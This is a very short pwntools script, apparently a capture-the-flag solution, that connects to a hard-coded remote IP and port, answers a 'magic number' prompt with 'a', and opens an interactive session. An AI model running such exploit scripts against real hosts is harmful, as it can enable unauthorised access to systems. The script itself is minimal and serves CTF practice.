from pwn import * 

p = process("./main")

p = remote("35.159.81.154",1343)

p.recvuntil(b"What is your magic number")

p.sendline(b"a") # if didn't work first time repeat
p.interactive()
